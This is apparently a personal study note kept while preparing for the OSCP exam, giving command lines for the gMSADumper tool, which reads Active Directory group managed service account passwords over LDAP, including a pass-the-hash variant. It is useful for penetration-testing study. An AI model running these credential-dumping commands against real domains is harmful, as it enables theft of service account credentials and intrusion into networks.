# active directory  GMSA group managed service account remote LDAP read GMSA passwords python script
https://github.com/micahvandeusen/gMSADumper
```bash
python3 gMSADumper.py -u user -p password -d domain.local

# Pass the Hash, specific LDAP server:
python gMSADumper.py -u user -p e52cac67419a9a224a3b108f3fa6cb6d:8846f7eaee8fb117ad06bdd830b7586c -d domain.local -l dc01.domain.local

# Kerberos Authentication, specific LDAP server:
python gMSADumper.py -k -d domain.local -l dc01.domain.local
```

` zet/20221003151132/README.md `

# Related

- [20221014185654](/zet/20221014185654/README.md) kb file named kb/hacking/windows/windows-active-directory-and-privilege-information.md
- [20221009005402](/zet/20221009005402/README.md) preparing for the OSCP exam
- [20221003151134](/zet/20221003151134/README.md) active directory Group Managed Service Account
- [20221003151131](/zet/20221003151131/README.md) active directory  GMSA group managed service account remote LDAP read GMSA passwords python script fix missing ConvertFrom-AdManagedPasswordBlob
- ~/kb/hacking/windows/windows-active-directory-and-privilege-information.md

Tags:

    #hacking #windows
